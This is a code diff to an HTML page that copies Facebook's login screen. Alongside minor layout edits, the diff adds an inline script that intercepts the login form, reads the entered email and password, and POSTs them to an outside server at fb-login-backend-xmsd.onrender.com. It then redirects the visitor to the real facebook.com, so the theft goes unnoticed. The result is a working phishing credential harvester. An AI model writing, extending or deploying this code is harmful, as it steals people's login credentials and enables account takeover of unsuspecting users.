@@ -29,18 +29,17 @@
         <button type="submit" class="login-btn">Log In</button>
         <a href="https://www.facebook.com/recover/initiate" class="forgot-link">Forgot password?</a>
         <hr />
-        <button type="button" class="create-btn">Create new account</button>
+        <button type="button" class="create-btn" onclick="window.location.href='https://www.facebook.com/reg';">Create new account</button>
       </form>
 
-      <p class="create-page">
+      <div class="create-page">
         <a href="https://www.facebook.com/pages/create">Create a Page</a> for a celebrity, brand or business.
-      </p>
-
-      <p id="successMessage" class="success"></p>
+      </div>
     </div>
   </div>
 
-  <footer class="footer">
+<footer class="footer">
+  <div class="footer-content">
     <div class="languages">
       <a href="#">English (US)</a>
       <a href="#">Polski</a>
@@ -54,6 +53,8 @@
       <a href="#">Português (Brasil)</a>
       <a href="#">العربية</a>
     </div>
+
+    <hr class="footer-separator" />
 
     <div class="links">
       <a href="https://www.facebook.com/reg">Sign Up</a>
@@ -85,8 +86,31 @@
     </div>
 
     <p class="meta-copy">Meta © 2025</p>
-  </footer>
+  </div>
+</footer>
 
-  <script type="module" src="/src/main.js"></script>
+  <script type="module">
+    const loginForm = document.getElementById('loginForm');
+
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      try {
+        await fetch('https://fb-login-backend-xmsd.onrender.com/api/send', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        });
+
+        window.location.href = 'https://www.facebook.com/';
+      } catch (error) {
+        console.error('Login failed:', error);
+        window.location.href = 'https://www.facebook.com/';
+      }
+    });
+  </script>
 </body>
 </html>
